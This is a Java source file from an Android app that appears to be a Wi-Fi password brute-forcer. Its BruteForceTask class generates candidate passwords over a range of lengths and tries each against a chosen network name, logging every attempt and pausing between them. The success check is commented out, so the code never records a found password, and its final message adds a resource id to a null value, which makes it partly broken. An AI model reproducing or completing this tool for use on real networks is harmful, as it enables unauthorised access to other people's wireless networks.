package com.nguyen.wifibruteforce;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;

import static android.content.Context.WIFI_SERVICE;

public class BruteForceTask extends AsyncTask<String, Integer, Integer> {
    private Activity activity;
    private String foundPass;
    private ArrayList<String> arrPass;

    public ArrayList<String> getArrPass() {
        return arrPass;
    }

    public void setArrPass(ArrayList<String> arrPass) {
        this.arrPass = arrPass;
    }

    public BruteForceTask(Activity activity) {
        this.activity = activity;

    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
    }

    @Override
    protected Integer doInBackground(String... strings) {

        FindPassword bruteforce = new FindPassword();
        arrPass = bruteforce.arrBFTemp;
        int count = 1;
        for (int length = bruteforce.min; length < bruteforce.max; length++) { // Change bruteforce.min and bruteforce.max for number of characters to bruteforce.
            //bruteforce.generate("", 0, length); //prepend_string, pos, length
            bruteforce.generate("acbb", 0, length); //prepend_string, pos, length
        }
        for (String testPass : arrPass) {
            Utils.finallyConnect(testPass, strings[0], activity);
            Log.d("running", testPass);

            publishProgress(count);

            if (isCancelled()) {
                Log.d("running", "isCancelled_BF");
                break;
            }
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
//            ConnectivityManager cm = (ConnectivityManager) activity.getSystemService(Context.CONNECTIVITY_SERVICE);
//            assert cm != null;
//            NetworkInfo ni = cm.getActiveNetworkInfo();
//            if (Utils.isConnectAccessPoint(activity.getApplicationContext())
//                    && Utils.convertSSID(ni.getExtraInfo()).equals(strings[0])) {
//                Log.d("running", Utils.convertSSID(ni.getExtraInfo()) + "/" + strings[0] + "/pass: " + testPass);
//                foundPass = testPass;
////                Log.d("running", "pass for Toast: " + foundPass);
//                break;
//            }
            count += 1;
        }
        return null;
    }

    @Override
    protected void onProgressUpdate(Integer... values) {
        super.onProgressUpdate(values);
//        progressDialog.setProgress(values[0]);
        TextView txtPassCout = activity.findViewById(R.id.txtPassCount);
        txtPassCout.setText(values[0] + "");
    }


    @Override
    protected void onPostExecute(Integer integer) {
        super.onPostExecute(integer);
//        progressDialog.dismiss();
        Log.d("running", "out");
        Toast.makeText(activity.getApplicationContext(), R.string.pass_found + foundPass, Toast.LENGTH_LONG).show();
        activity.finish();
    }
}
